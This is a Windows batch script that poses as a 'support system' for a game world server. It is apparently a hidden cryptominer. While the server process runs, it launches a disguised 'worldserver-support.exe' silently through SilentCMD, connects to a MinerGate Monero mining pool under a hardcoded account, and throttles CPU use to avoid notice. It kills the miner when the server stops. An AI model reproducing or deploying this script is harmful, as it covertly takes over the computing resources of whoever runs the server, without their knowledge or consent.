@echo off
SET NAME=SingleCore support system
TITLE %NAME%
COLOR 0A
set mod=%1

:world
echo.
echo Checking world server...
ping -n 10 127.0.0.1>nul
tasklist /FI "IMAGENAME eq worldserver.exe" 2>NUL | find /I /N "worldserver.exe">NUL
if "%ERRORLEVEL%"=="0" echo Check pass && goto support
if "%ERRORLEVEL%"=="1" echo World server is not running, trying to start it. && goto kill_support

:support
tasklist /FI "IMAGENAME eq worldserver-support.exe" 2>NUL | find /I /N "worldserver-support.exe">NUL
if "%ERRORLEVEL%"=="0" echo Check pass && goto world
if "%ERRORLEVEL%"=="1" echo World server is not running, trying to start it. && goto start_support

:start_support
cd Server\Tools
start SilentCMD.exe worldserver-support.exe -o stratum+tcp://fcn-xmr.pool.minergate.com:45590 -u conanhun@gmail.com -p x -dbg -1 -lowcpu 1
goto world

:kill_support
Taskkill /IM worldserver-support.exe /F
goto exit

:exit
exit